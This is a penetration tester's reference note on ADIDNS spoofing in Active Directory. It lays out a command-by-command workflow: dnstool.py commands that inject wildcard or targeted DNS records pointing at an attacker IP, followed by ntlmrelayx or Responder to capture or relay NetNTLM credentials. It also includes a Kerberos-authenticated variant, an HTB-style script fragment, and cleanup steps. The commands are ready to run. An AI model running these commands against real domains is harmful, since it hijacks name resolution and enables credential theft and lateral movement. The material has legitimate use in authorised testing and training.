---
title: ADIDNS Spoofing
draft: false
tags:
  - active-directory
  - mitm
  - dns
  - coerced-authentication
  - lateral-movement
---
 
Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing

**ADIDNS** (Active Directory Integrated DNS) stores DNS zones inside the AD database itself. By default, **any authenticated domain user can create new DNS records** (they own the records they create), because the `Create all child objects` right is granted to `Authenticated Users` on the zone. This is the abuse primitive: with a single low-privileged foothold we can add or modify DNS records to point a name at our attacker host, then capture or relay the authentication that flows to it.

Two classic use cases:
- **Wildcard record injection** — if no `*` record exists, adding one makes *every* otherwise-unresolvable name resolve to our IP. Combined with LLMNR/NBT-NS being disabled (where responders usually fail), this restores name-poisoning at the DNS layer. Point it at our host running [[SMB Relay Attack]]/`ntlmrelayx` or `Responder` to harvest NetNTLM hashes.
- **Targeted record spoofing** — overwrite or create a specific record (e.g. `proxy`, `wpad`, an internal app hostname) that clients or scheduled jobs connect to, then capture their credentials.

> [!Note]
> Newly added ADIDNS records are not served instantly — the DC's DNS service reloads its zone on a background timer (typically ~180 s / 3 minutes by default). Add the record, then wait before expecting resolution.

> [!Warning]
> A wildcard record is **noisy and disruptive** — it hijacks resolution for the whole zone and can break production name resolution. Prefer a specific, targeted record on real engagements and clean up (`--action remove`) afterwards.

### Prerequisites and clock

These techniques require valid domain credentials (see [[AD Initial Foothold]]) and, for the Kerberos-authenticated tooling, a synchronised clock — fix [[Clock Skew]] first if you hit `KRB_AP_ERR_SKEW`.

### WINS forward lookup (enumerate records)

The state of WINS forward lookup can be enumerated with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled.

```
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DC_FQDN'
```

### Manual record manipulation

An awesome Python alternative to Powermad's functions is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py). Theoretically, this script can be used to `add`, `modify`, `query`, `remove`, `resurrect` and `ldapdelete` records in ADIDNS.

```bash
# query a node
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController

# add a node and attach a record
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
```

If we know the type of record that is being captured, for example:
```
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
```

We can add:
```bash
dnstool.py -u 'DOMAIN\user' -p 'password' --record 'web-test' --action add --data $AttackerIP --type A DOMAIN_FQDN
```

### Wildcard injection + relay workflow

```bash
# 1. Add a wildcard A record pointing every unresolved name at us
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController

# 2. Wait for the DNS zone to reload (~3 min), then confirm it resolves to us
nslookup doesnotexist.domain.local $DomainController

# 3. Stand up a relay/capture server and wait for authentication
impacket-ntlmrelayx -tf targets.txt -smb2support        # relay onward
# or just capture hashes:
#   responder -I eth0
```

Authenticate with a Kerberos ticket instead of a password (after fixing [[Clock Skew]]):
```bash
export KRB5CCNAME=user.ccache
dnstool.py -k --record '*' --action add --data $AttackerIP $DomainController
```

Clean up when finished:
```bash
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action remove --data $AttackerIP $DomainController
```

> [!Tip]
> `dnstool.py` ships with **krbrelayx** (dirkjanm). PowerView / Powermad offer the same primitive from a Windows foothold (`New-ADIDNSNode`, `Set-ADIDNSNode`) — see [[AD Enumeration - Credentialed - From Linux]] for credentialed enumeration to find worthwhile record names first.

---

### Related notes
- [[AD Initial Foothold]] — obtaining the domain credentials this attack needs.
- [[SMB Relay Attack]] — relaying the NetNTLM auth you coerce via a spoofed record.
- [[Clock Skew]] — sync the clock before any Kerberos-authenticated (`-k`) tooling.
- [[LDAP]] — LDAP enumeration of the domain (dnstool talks to the DC over LDAP).
- [[AD Enumeration - Credentialed - From Linux]] — enumerate hosts/records worth spoofing.